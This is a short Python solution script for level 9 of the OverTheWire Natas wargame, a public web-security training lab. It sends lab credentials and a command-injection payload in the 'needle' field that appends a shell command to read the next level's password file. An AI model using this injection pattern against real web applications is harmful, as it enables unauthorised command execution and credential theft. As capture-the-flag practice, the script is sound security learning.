#!/usr/bin/env python

import requests
import json
NATAS = "natas9"
PASS = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'
URL = "http://" + NATAS + ".natas.labs.overthewire.org"
#payload = { 'secret': 'FOEIUWGHFEEUHOFUOIU', 'submit': True }
#r = requests.get(URL , auth=(NATAS, PASS))
r = requests.post(URL , auth=(NATAS, PASS), data={'needle': '; cat /etc/natas_webpass/natas10 ; ', 'submit value': True })
print(r.text)
print(r.history)
print(r.status_code)


print(r.headers)
